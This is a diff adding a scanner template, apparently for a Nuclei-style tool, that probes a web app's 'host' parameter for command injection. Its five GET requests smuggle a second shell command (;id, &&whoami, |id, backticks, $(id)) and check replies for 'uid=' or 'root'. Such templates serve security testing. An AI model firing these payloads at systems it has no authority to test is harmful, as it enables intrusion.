@@ -1,0 +1,60 @@
+id: vf-crit-command-injection-01
+
+name: Advanced Command Injection
+
+severity: Critical
+
+category: Injection
+
+requests:
+
+  - id: cmd-semicolon
+    method: GET
+    path: "/?host=127.0.0.1;id"
+    matchers:
+      type: word
+      words:
+        - "uid="
+        - "gid="
+
+  - id: cmd-and
+    method: GET
+    path: "/?host=127.0.0.1&&whoami"
+    matchers:
+      type: word
+      words:
+        - "root"
+        - "www-data"
+
+  - id: cmd-pipe
+    method: GET
+    path: "/?host=127.0.0.1|id"
+    matchers:
+      type: word
+      words:
+        - "uid="
+
+  - id: cmd-backtick
+    method: GET
+    path: "/?host=`id`"
+    matchers:
+      type: word
+      words:
+        - "uid="
+
+  - id: cmd-subshell
+    method: GET
+    path: "/?host=$(id)"
+    matchers:
+      type: word
+      words:
+        - "uid="
+
+metadata:
+
+  payloads:
+    - ";id"
+    - "&&id"
+    - "|id"
+    - "`id`"
+    - "$(id)"
